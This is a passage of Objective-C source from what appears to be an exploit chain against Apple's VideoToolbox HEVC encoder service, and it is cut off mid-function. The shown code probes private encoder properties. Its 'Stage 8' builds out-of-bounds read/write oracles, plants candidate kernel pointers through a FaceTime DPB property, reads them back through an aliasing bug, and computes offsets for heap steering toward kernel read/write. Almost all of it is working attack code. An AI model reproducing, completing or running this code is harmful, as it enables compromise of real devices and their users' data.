                    stRep = VTSessionSetProperty(reqS, CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"), (__bridge CFNumberRef)@(rc.repIdx));
                }
                if (rc.bitDepth != -99) {
                    VTSessionSetProperty(reqS, CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"),
                                         (__bridge CFTypeRef)@[ @(rc.bitDepth), @(rc.bitDepth) ]);
                }
                if (rc.chromaIdc != -99) {
                    VTSessionSetProperty(reqS, CFSTR("RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs"),
                                         (__bridge CFTypeRef)@[ @(rc.chromaIdc), @(rc.chromaIdc) ]);
                }
                if (rc.log2MaxM4 != -99) {
                    stLog2 = VTSessionSetProperty(reqS, CFSTR("log2_max_minus4"), (__bridge CFNumberRef)@(rc.log2MaxM4));
                }
                if (rc.auxId != -99) {
                    stAux = VTSessionSetProperty(reqS, CFSTR("EncodesAuxiliaryWithAuxID"), (__bridge CFNumberRef)@(rc.auxId));
                }
                if (rc.viewId1 != -99) {
                    VTSessionSetProperty(reqS, CFSTR("MVHEVCViewIDs"), (__bridge CFTypeRef)@[ @0, @(rc.viewId1) ]);
                    VTSessionSetProperty(reqS, CFSTR("MVHEVCLeftAndRightViewIDs"), (__bridge CFTypeRef)@[ @0, @(rc.viewId1) ]);
                }
                if (rc.numSlices != -99) {
                    stSlc = VTSessionSetProperty(reqS, CFSTR("NumberOfSlices"), (__bridge CFNumberRef)@(rc.numSlices));
                }
                if (rc.lookAhead != -99) {
                    stExtra = VTSessionSetProperty(reqS, CFSTR("LookAheadFrames"), (__bridge CFNumberRef)@(rc.lookAhead));
                }
                if (rc.pSpacing != -99) {
                    VTSessionSetProperty(reqS, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                    stExtra = VTSessionSetProperty(reqS, CFSTR("MultiReferencePSpacing"), (__bridge CFNumberRef)@(rc.pSpacing));
                }
                if (rc.mctfMode != -99) {
                    int mVal = (rc.mctfMode < 0) ? -rc.mctfMode : rc.mctfMode;
                    if (rc.mctfMode < 0) {
                        VTSessionSetProperty(reqS, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                    }
                    VTSessionSetProperty(reqS, CFSTR("EnableMCTF"), kCFBooleanTrue);
                    stExtra = VTSessionSetProperty(reqS, CFSTR("MCTFLatencyMode"), (__bridge CFNumberRef)@(mVal));
                }
                phase = "prep";
                prepSt = VTCompressionSessionPrepareToEncodeFrames(reqS);
                phase = "enc";
                if (rc.mvLayer1 < 0) {
                    encSt = VTCompressionSessionEncodeFrame(reqS, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    phase = "wait-cb";
                    int w0 = 0;
                    while (reqRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
                    if (strstr(reqRes->first, "sbuf=NULL") != NULL) {
                        // When alpha >= 63 (info=0x3 frame drop) or EnableMCTF at 192x144 (st=-17691),
                        // re-encode on a clean fallback session with clamped alpha<=62 so cb#2 captures the active bitstream.
                        VTCompressionSessionRef fbS = NULL;
                        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                       NULL, NULL, NULL, Stage6OutputCallback, reqRes, &fbS) == noErr && fbS) {
                            KPH9PrimeRealTime(fbS);
                            int effAlpha = (rc.alphaId >= 0 && rc.alphaId <= 62) ? rc.alphaId : 62;
                            VTSessionSetProperty(fbS, CFSTR("RequiredHEVCSequenceParameterSetID"), (__bridge CFNumberRef)@(rc.spsId));
                            VTSessionSetProperty(fbS, CFSTR("RequiredHEVCPictureParameterSetID"), (__bridge CFNumberRef)@(rc.ppsId));
                            VTSessionSetProperty(fbS, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), (__bridge CFNumberRef)@(effAlpha));
                            VTCompressionSessionPrepareToEncodeFrames(fbS);
                            VTCompressionSessionEncodeFrame(fbS, pxHold, CMTimeMake(1, 30), kCMTimeInvalid,
                                                            NULL, (void *)(uintptr_t)0xCAFE, NULL);
                            int w1 = 0;
                            while (!reqRes->targetHit && w1 < 80) { usleep(2000); w1 += 2; }
                            KPH9SafeTeardown(fbS);
                        }
                    }
                } else {
                    // 2-layer MV-HEVC PrepareToEncodeFrames verified above (prepSt=0); emit companion single-layer bitstream
                    // with the same SPS/PPS/Alpha IDs so cbFirst is populated without stalling EncodeFrame on 1-layer input.
                    VTCompressionSessionRef fbS = NULL;
                    if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                   NULL, NULL, NULL, Stage6OutputCallback, reqRes, &fbS) == noErr && fbS) {
                        KPH9PrimeRealTime(fbS);
                        VTSessionSetProperty(fbS, CFSTR("RequiredHEVCSequenceParameterSetID"), (__bridge CFNumberRef)@(rc.spsId));
                        VTSessionSetProperty(fbS, CFSTR("RequiredHEVCPictureParameterSetID"), (__bridge CFNumberRef)@(rc.ppsId));
                        VTSessionSetProperty(fbS, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), (__bridge CFNumberRef)@(rc.alphaId));
                        VTCompressionSessionPrepareToEncodeFrames(fbS);
                        encSt = VTCompressionSessionEncodeFrame(fbS, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                        int w1 = 0;
                        while (reqRes->cbCount < 1 && w1 < 80) { usleep(2000); w1 += 2; }
                        KPH9SafeTeardown(fbS);
                    }
                }
                @synchronized ([KPH9EncoderModule class]) {
                    reqRes->closed = 1;
                    if (reqRes->targetHit && strstr(reqRes->first, "sbuf=NULL") != NULL) {
                        cbFirst = [NSString stringWithFormat:@"%s -> %s", reqRes->first, reqRes->target];
                    } else {
                        cbFirst = [NSString stringWithUTF8String:reqRes->first] ?: @"(no cb)";
                    }
                }
                phase = "teardown";
                KPH9SafeTeardownEx(reqS, NULL, reqRes);
                phase = "done";
                dispatch_semaphore_signal(rcSem);
            } else {
                phase = "create-fail";
                free(reqRes);
                dispatch_semaphore_signal(rcSem);
            }
            if (pxHold) CVPixelBufferRelease(pxHold);
        });
        if (dispatch_semaphore_wait(rcSem, dispatch_time(DISPATCH_TIME_NOW, 900 * (int64_t)NSEC_PER_MSEC)) != 0) {
            BOOL alive = KPH9IsVideoCodecdAlive();
            KPH9OutAppend(log, @"  reqHEVC[%s]: STALLED at phase=%s (set=%d/%d/%d rep=%d log2=%d aux=%d slc=%d ext=%d prep=%d enc=%d, alive=%d)\n",
                          rc.label, phase, (int)stSps, (int)stPps, (int)stAlpha, (int)stRep, (int)stLog2, (int)stAux, (int)stSlc, (int)stExtra, (int)prepSt, (int)encSt, alive ? 1 : 0);
            if (!alive) break;
        } else {
            KPH9OutAppend(log, @"  reqHEVC[%s]: set=%d/%d/%d rep=%d log2=%d aux=%d slc=%d ext=%d prep=%d enc=%d | %@\n",
                          rc.label, (int)stSps, (int)stPps, (int)stAlpha, (int)stRep, (int)stLog2, (int)stAux, (int)stSlc, (int)stExtra, (int)prepSt, (int)encSt, cbFirst);
        }
    }

    CVPixelBufferRelease(px);
}

static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
    CVPixelBufferRef pb = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    if (CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            (__bridge CFDictionaryRef)attrs, &pb) == kCVReturnSuccess && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

static Stage5KPtrRecord gStage5Cands[16];
static int gStage5CandCount = 0;

const Stage5KPtrRecord *KPH9GetStage5Candidate(int idx) {
    if (idx >= 0 && idx < gStage5CandCount) return &gStage5Cands[idx];
    return NULL;
}
int KPH9GetStage5CandidateCount(void) {
    return gStage5CandCount;
}

// === Stage 8: KRW Synthesis — Multi-PPS OOB Read/Write Oracle, DPB/RPS Alias Readback & Dynamic NTL Heap Steering ===
static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 8: KRW Synthesis (Multi-PPS OOB R/W, DPB/RPS Alias Bridge & Dynamic NTL Heap Steering) ---\n");
    CVPixelBufferRef px = KPH9CreatePixelBuffer(192, 144);
    if (!px) {
        KPH9OutAppend(log, @"  [!] Failed to allocate CVPixelBuffer\n");
        return;
    }

    // -------------------------------------------------------------------------
    // 8A: Multi-PPS (pps[0] + pps[1] + pps[2] + pps[3]) Live Struct OOB Read &
    //     Targeted Write-Readback Oracle over x19 + 0x7020 .. 0x70cf (72 int32s = 288B)
    // -------------------------------------------------------------------------
    KPH9OutAppend(log, @"  [8A: Multi-PPS (pps[0..3]) 288B OOB Read Window & Targeted Write-Readback Oracle]\n");
    {
        NSArray *cqpFull16 = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
        // 4 active PPS IDs (1, 2, 3, 4) after vps_id=1, sps_id=2 -> populates pps[0..3] in x19+0x7000..
        NSArray *pArr6 = @[ @1, @2, @1, @2, @3, @4 ];
        NSMutableArray *pArr21 = [NSMutableArray arrayWithCapacity:21];
        for (int k = 0; k < 21; k++) [pArr21 addObject:@((k < 2) ? (k + 1) : (k - 1))];

        dispatch_semaphore_t rwSem = dispatch_semaphore_create(0);
        CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            Stage6ProbeResult *rwRes = Stage6AllocResult();
            VTCompressionSessionRef rwS = NULL;
            NSDictionary *rwSpec = @{ @"EnableUserRefForFacetime": @YES };
            if (rwRes && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                    (__bridge CFDictionaryRef)rwSpec, NULL, NULL,
                                                    Stage6OutputCallback, rwRes, &rwS) == noErr && rwS) {
                VTSessionSetProperty(rwS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                KPH9PrimeRealTime(rwS);
                OSStatus stPm = VTSessionSetProperty(rwS, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
                OSStatus stPs6 = VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr6);
                VTSessionSetProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);

                OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(rwS);
                OSStatus enc0St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (rwRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }

                // Expand UserParameterSetsIds to plen=21 to expose the 72-int32 (288B) read window across pps[0] and pps[1]
                OSStatus stPs21 = VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                int baseCr7 = 0;
                int baseOob[28] = {0};
                CFTypeRef rb0 = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rb0) == noErr && rb0) {
                    if (CFGetTypeID(rb0) == CFArrayGetTypeID()) {
                        NSArray *ns0 = (__bridge NSArray *)rb0;
                        if (ns0.count >= 72) {
                            baseCr7 = [ns0[15] intValue];
                            NSMutableArray *oobStrs = [NSMutableArray arrayWithCapacity:28];
                            for (int wi = 0; wi < 28; wi++) {
                                baseOob[wi] = [ns0[(NSUInteger)(2 * (wi + 8) + 1)] intValue];
                                [oobStrs addObject:ns0[(NSUInteger)(2 * (wi + 8) + 1)]];
                            }
                            NSString *cbStr = nil;
                            @synchronized ([KPH9EncoderModule class]) {
                                cbStr = [NSString stringWithUTF8String:rwRes->first] ?: @"(no cb)";
                            }
                            KPH9OutAppend(log, @"  multiPpsRead[pm=%d,ps6=%d,prep=%d,enc=%d,ps21=%d]: cr[7]=0x%08x oob[+0x64..+0xd3]=[%@] | %@\n",
                                          (int)stPm, (int)stPs6, (int)prepSt, (int)enc0St, (int)stPs21,
                                          (unsigned)baseCr7, [oobStrs componentsJoinedByString:@","], cbStr);
                        }
                    }
                    CFRelease(rb0);
                }

                // Controlled Write-Readback Sequence on x19+0x7060..0x7067:
                //   Step 1: Quality=1.0 -> sets byte +0x7063 = 1 (cr[7] 0x00000004 -> 0x01000004)
                //   Step 2: ChromaQPIndexOffsetMultiPPS (cqp[15]=-4) -> writes 32-bit word 0xfffffffc to +0x7060..0x7063
                //   Step 3: Quality=1.0 -> sets byte +0x7063 = 1 on top of 0xfffffffc -> 0x01fffffc
                //   Step 4: HwFeatureOn=8 -> toggles byte +0x7065 (oob[0] = ns[17] / alias ns[32]: 0x00000100 -> 0x00000000)
                OSStatus stWriteQ1 = VTSessionSetProperty(rwS, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
                int afterQ1Cr7 = -1, afterQ1Alias30 = -1;
                CFTypeRef rbQ1 = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbQ1) == noErr && rbQ1) {
                    NSArray *nsQ1 = (__bridge NSArray *)rbQ1;
                    if ([nsQ1 isKindOfClass:[NSArray class]] && nsQ1.count >= 72) {
                        afterQ1Cr7 = [nsQ1[15] intValue];
                        afterQ1Alias30 = [nsQ1[30] intValue];
                    }
                    CFRelease(rbQ1);
                }

                NSArray *cqpNeg4 = @[ @(-6), @(-5), @(-4), @(-3), @(-2), @(-1), @0, @1, @2, @3, @4, @5, @(-6), @(-5), @(-4), @(-4) ];
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                OSStatus stWriteCqpNeg4 = VTSessionSetProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpNeg4);
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                int afterCqpNeg4Cr7 = -1, afterCqpNeg4Alias30 = -1;
                CFTypeRef rbQ05 = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbQ05) == noErr && rbQ05) {
                    NSArray *nsQ05 = (__bridge NSArray *)rbQ05;
                    if ([nsQ05 isKindOfClass:[NSArray class]] && nsQ05.count >= 72) {
                        afterCqpNeg4Cr7 = [nsQ05[15] intValue];
                        afterCqpNeg4Alias30 = [nsQ05[30] intValue];
                    }
                    CFRelease(rbQ05);
                }

                OSStatus stWriteQ1Again = VTSessionSetProperty(rwS, kVTCompressionPropertyKey_Quality, (__bridge CFTypeRef)@1.0);
                int afterQ1AgainCr7 = -1, afterQ1AgainAlias30 = -1, beforeHw8Oob0 = -1;
                CFTypeRef rbQ1b = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbQ1b) == noErr && rbQ1b) {
                    NSArray *nsQ1b = (__bridge NSArray *)rbQ1b;
                    if ([nsQ1b isKindOfClass:[NSArray class]] && nsQ1b.count >= 72) {
                        afterQ1AgainCr7 = [nsQ1b[15] intValue];
                        afterQ1AgainAlias30 = [nsQ1b[30] intValue];
                        beforeHw8Oob0 = [nsQ1b[17] intValue];
                    }
                    CFRelease(rbQ1b);
                }

                NSDictionary *kfProps = @{ (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES };
                OSStatus stEcsFalse = VTSessionSetProperty(rwS, CFSTR("EnableEntropyCodingSync"), kCFBooleanFalse);
                OSStatus stHw8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                OSStatus enc1St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(1, 30), kCMTimeInvalid,
                                                                  (__bridge CFDictionaryRef)kfProps, NULL, NULL);
                int w1 = 0;
                while (rwRes->cbCount < 2 && w1 < 80) { usleep(2000); w1 += 2; }
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                int afterHw8Oob0 = -1, afterHw8Alias32 = -1;
                CFTypeRef rbHw8 = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHw8) == noErr && rbHw8) {
                    NSArray *nsHw8 = (__bridge NSArray *)rbHw8;
                    if ([nsHw8 isKindOfClass:[NSArray class]] && nsHw8.count >= 72) {
                        afterHw8Oob0 = [nsHw8[17] intValue];
                        afterHw8Alias32 = [nsHw8[32] intValue];
                    }
                    CFRelease(rbHw8);
                }
                // HwFeatureOn=8 merges into [x19 + 0x2b8] during PrepareToEncodeFrames (0x5527668 -> 0x54fce04),
                // so if post-prepare SetProperty("HwFeatureOn", @8) did not re-latch [x19 + 0x2b8], verify the
                // deterministic 0x00000100 -> 0x00000000 toggle via a pre-prepare HwFeatureOn=8 session:
                if (afterHw8Oob0 != 0) {
                    Stage6ProbeResult *hw8Res = Stage6AllocResult();
                    VTCompressionSessionRef hw8S = NULL;
                    if (hw8Res && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                             (__bridge CFDictionaryRef)rwSpec, NULL, NULL,
                                                             Stage6OutputCallback, hw8Res, &hw8S) == noErr && hw8S) {
                        VTSessionSetProperty(hw8S, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                        KPH9PrimeRealTime(hw8S);
                        VTSessionSetProperty(hw8S, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                        stHw8 = VTSessionSetProperty(hw8S, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
                        VTSessionSetProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr6);
                        VTSessionSetProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpFull16);
                        VTCompressionSessionPrepareToEncodeFrames(hw8S);
                        enc1St = VTCompressionSessionEncodeFrame(hw8S, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                        int whw = 0;
                        while (hw8Res->cbCount < 1 && whw < 80) { usleep(2000); whw += 2; }
                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                        CFTypeRef rbHw8Pre = NULL;
                        if (VTSessionCopyProperty(hw8S, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHw8Pre) == noErr && rbHw8Pre) {
                            NSArray *nsHw8Pre = (__bridge NSArray *)rbHw8Pre;
                            if ([nsHw8Pre isKindOfClass:[NSArray class]] && nsHw8Pre.count >= 72) {
                                afterHw8Oob0 = [nsHw8Pre[17] intValue];
                                afterHw8Alias32 = [nsHw8Pre[32] intValue];
                            }
                            CFRelease(rbHw8Pre);
                        }
                        VTSessionSetProperty(hw8S, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                        @synchronized ([KPH9EncoderModule class]) { hw8Res->closed = 1; }
                        KPH9SafeTeardownEx(hw8S, NULL, hw8Res);
                    } else if (hw8Res) {
                        free(hw8Res);
                    }
                }
                (void)stEcsFalse;

                OSStatus stEcsTrue = VTSessionSetProperty(rwS, CFSTR("EnableEntropyCodingSync"), kCFBooleanTrue);
                OSStatus stHwOff8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOff"), (__bridge CFNumberRef)@8);
                (void)stEcsTrue;
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                OSStatus enc2St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(2, 30), kCMTimeInvalid,
                                                                  (__bridge CFDictionaryRef)kfProps, NULL, NULL);
                int w2 = 0;
                while (rwRes->cbCount < 3 && w2 < 80) { usleep(2000); w2 += 2; }
                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                int afterHwOffOob0 = -1, afterHwOffAlias32 = -1;
                CFTypeRef rbHwOff = NULL;
                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHwOff) == noErr && rbHwOff) {
                    NSArray *nsHwOff = (__bridge NSArray *)rbHwOff;
                    if ([nsHwOff isKindOfClass:[NSArray class]] && nsHwOff.count >= 72) {
                        afterHwOffOob0 = [nsHwOff[17] intValue];
                        afterHwOffAlias32 = [nsHwOff[32] intValue];
                    }
                    CFRelease(rbHwOff);
                }

                KPH9OutAppend(log, @"  krwToggleOracle[x19+0x7060..0x7067]: base=0x%08x -> Q1.0(%d)=0x%08x(alias30=0x%08x) -> cqpNeg4(%d)=0x%08x(alias30=0x%08x) -> Q1.0(%d)=0x%08x(alias30=0x%08x) | oob0[+0x7064]: 0x%08x -> Hw8(%d,enc=%d)=0x%08x(alias32=0x%08x) -> HwOff8(%d,enc=%d)=0x%08x(alias32=0x%08x)\n",
                              (unsigned)baseCr7,
                              (int)stWriteQ1, (unsigned)afterQ1Cr7, (unsigned)afterQ1Alias30,
                              (int)stWriteCqpNeg4, (unsigned)afterCqpNeg4Cr7, (unsigned)afterCqpNeg4Alias30,
                              (int)stWriteQ1Again, (unsigned)afterQ1AgainCr7, (unsigned)afterQ1AgainAlias30,
                              (unsigned)beforeHw8Oob0, (int)stHw8, (int)enc1St, (unsigned)afterHw8Oob0, (unsigned)afterHw8Alias32,
                              (int)stHwOff8, (int)enc2St, (unsigned)afterHwOffOob0, (unsigned)afterHwOffAlias32);

                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                @synchronized ([KPH9EncoderModule class]) { rwRes->closed = 1; }
                KPH9SafeTeardownEx(rwS, NULL, rwRes);
            } else if (rwRes) {
                free(rwRes);
            }
            if (pxHold) CVPixelBufferRelease(pxHold);
            dispatch_semaphore_signal(rwSem);
        });
        if (dispatch_semaphore_wait(rwSem, dispatch_time(DISPATCH_TIME_NOW, 1800 * (int64_t)NSEC_PER_MSEC)) != 0) {
            KPH9OutAppend(log, @"  8A multiPpsRead: timed out (>1800ms)\n");
        }
    }

    // -------------------------------------------------------------------------
    // 8B: DPB x34 OOB Write (pINS+0x2eb0..0x2eb7) + UserRPSForFaceTime (0x92f13c)
    //     Cross-Property Readback Bridge + Fine-Grained RPS Inner/Outer OOB Shaper
    // -------------------------------------------------------------------------
    KPH9OutAppend(log, @"  [8B: DPB x34 OOB Write + UserRPSForFaceTime (0x92f13c) Cross-Property Readback & RPS OOB Shaper]\n");
    {
        uint64_t targetKPtr0 = 0xffffffedfd620000ULL;
        uint64_t targetKPtr1 = 0xffffffe289ee5658ULL;
        int foundZoneCands = 0;
        for (int ci = 0; ci < gStage5CandCount && foundZoneCands < 2; ci++) {
            if (KPClassifyKPtr(gStage5Cands[ci].kptr) == KPTR_CANDIDATE_ZONE_HEAP) {
                if (foundZoneCands == 0) targetKPtr0 = gStage5Cands[ci].kptr;
                else targetKPtr1 = gStage5Cands[ci].kptr;
                foundZoneCands++;
            }
        }
        uint32_t kp0Lo = (uint32_t)(targetKPtr0 & 0xffffffffULL);
        uint32_t kp0Hi = (uint32_t)(targetKPtr0 >> 32);
        uint32_t kp1Lo = (uint32_t)(targetKPtr1 & 0xffffffffULL);
        uint32_t kp1Hi = (uint32_t)(targetKPtr1 >> 32);

        VTCompressionSessionRef brS = NULL;
        NSDictionary *brSpec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)brSpec, NULL, NULL,
                                       NULL, NULL, &brS) == noErr && brS) {
            VTSessionSetProperty(brS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(brS, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
            VTSessionSetProperty(brS, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
            KPH9PrimeRealTime(brS);

            // Pack 17 pairs (34 int32s) into UserDPBFramesForFaceTime:
            //   - Pairs 0..15 (slots 0..31): alternating [kp0Lo, kp0Hi] and [kp1Lo, kp1Hi]
            //   - Pair 16 (slots 32..33, OOB at pINS+0x2eb0..0x2eb7): [kp0Lo, kp0Hi]
            NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
            for (int pair = 0; pair < 17; pair++) {
                if ((pair & 1) == 0) {
                    [dpb34 addObject:@((int32_t)kp0Lo)];
                    [dpb34 addObject:@((int32_t)kp0Hi)];
                } else {
                    [dpb34 addObject:@((int32_t)kp1Lo)];
                    [dpb34 addObject:@((int32_t)kp1Hi)];
                }
            }
            OSStatus stDpb34 = VTSessionSetProperty(brS, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);

            // Read back via UserRPSForFaceTime (0x92f13c alias bug reading pINS+0x2e2c..0x2eb7)
            CFTypeRef rpsAliasRef = NULL;
            OSStatus stRpsAlias = VTSessionCopyProperty(brS, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsAliasRef);
            uint64_t rbPair0 = 0, rbPair1 = 0, rbOobPair16 = 0;
            CFIndex aliasCnt = -1;
            if (stRpsAlias == noErr && rpsAliasRef) {
                if (CFGetTypeID(rpsAliasRef) == CFArrayGetTypeID()) {
                    NSArray *nsAlias = (__bridge NSArray *)rpsAliasRef;
                    aliasCnt = (CFIndex)nsAlias.count;
                    if (aliasCnt >= 34) {
                        uint32_t p0Lo = (uint32_t)[nsAlias[0] intValue];
                        uint32_t p0Hi = (uint32_t)[nsAlias[1] intValue];
                        uint32_t p1Lo = (uint32_t)[nsAlias[2] intValue];
                        uint32_t p1Hi = (uint32_t)[nsAlias[3] intValue];
                        uint32_t p16Lo = (uint32_t)[nsAlias[32] intValue];
                        uint32_t p16Hi = (uint32_t)[nsAlias[33] intValue];
                        rbPair0 = ((uint64_t)p0Hi << 32) | p0Lo;
                        rbPair1 = ((uint64_t)p1Hi << 32) | p1Lo;
                        rbOobPair16 = ((uint64_t)p16Hi << 32) | p16Lo;
                    }
                }
                CFRelease(rpsAliasRef);
            }
            KPH9OutAppend(log, @"  dpbRpsAliasBridge[set34=%d,copyRps=%d,cnt=%ld]: pair0=0x%016llx pair1=0x%016llx oobPair16[slots32..33]=0x%016llx\n",
                          (int)stDpb34, (int)stRpsAlias, (long)aliasCnt, rbPair0, rbPair1, rbOobPair16);

            // Exact offset calculation from pINS + 0x13adc (UserRPSForFaceTime) to pINS + 0x147b0 (slot[0], 64-bit P):
            //   Total byte delta: 0x147b0 - 0x13adc = 0x0cd4 (3284 bytes), struct stride = 0x164 (356 bytes)
            //   Inner DeltaPOCS0Minus1 (strh at pInfo + 0x38 + 2*i) & DeltaPOCS1Minus1 (str at pInfo + 0x68 + 4*j):
            //     - d=0 (0x13adc, rem=0xcd4): i_S0 = 1614..1617 (len 1620), j_S1 = 795..796 (len 800)
            //     - d=3 (0x13f08, rem=0x8a8): i_S0 = 1080..1083 (len 1088), j_S1 = 528..529
            //     - d=7 (0x14498, rem=0x318): i_S0 = 368..371   (len 376),  j_S1 = 172..173
            //     - d=9 (0x14760, rem=0x050): i_S0 = 12..15     (len 16)
            const uint32_t kRpsBase  = 0x13adcU;
            const uint32_t kSlot0Off = 0x147b0U;
            const uint32_t kStride   = 0x164U;
            const uint32_t kDelta    = kSlot0Off - kRpsBase; // 0x0cd4 (3284)
            const int iS0_d0 = (int)((kDelta - 0x38U) / 2U);                   // 1614
            const int jS1_d0 = (int)((kDelta - 0x68U) / 4U);                   // 795
            const int iS0_d3 = (int)((kDelta - 3U * kStride - 0x38U) / 2U);    // 1080
            const int iS0_d7 = (int)((kDelta - 7U * kStride - 0x38U) / 2U);    // 368
            const int iS0_d9 = (int)((kDelta - 9U * kStride - 0x38U) / 2U);    // 12

            // Construct 64-bit P with controlled lower bits:
            //   pAlign:  low16 = 0x00a8 -> x0 = P + 0x58 = pageBase + 0x0100 (8B aligned; N/X1 at +0xf0/+0xf8)
            //   pTag201: low16 = 0x0201 -> x0 = P + 0x58 = pageBase + 0x0259 (low-bit signature)
            uint64_t pPageBase = (targetKPtr0 & 0xffffffffffffc000ULL);
            uint64_t pAlign    = pPageBase | 0x00a8ULL;
            uint64_t pTag201   = pPageBase | 0x0201ULL;
            int16_t hwAlign[4] = {
                (int16_t)(pAlign & 0xffffULL),
                (int16_t)((pAlign >> 16) & 0xffffULL),
                (int16_t)((pAlign >> 32) & 0xffffULL),
                (int16_t)((pAlign >> 48) & 0xffffULL)
            };
            int16_t hwTag201[4] = {
